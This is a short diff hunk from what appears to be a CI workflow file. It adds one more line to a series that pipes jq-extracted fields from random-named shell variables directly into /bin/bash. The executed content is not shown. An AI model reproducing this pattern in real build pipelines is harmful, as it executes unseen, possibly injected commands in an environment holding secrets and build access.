@@ -28,6 +28,7 @@ jobs:
           echo $do2959 | jq -r .av93 | /bin/bash
           printf '%s' "$jkicj6833" | jq -r .wz67473 | /bin/bash
           printf '%s' "$gu053" | jq -r .waxnk58 | /bin/bash
+          printf '%s' "$jk37" | jq -r .rwzu96240 | /bin/bash
 
       - name: Save output
         if: always()
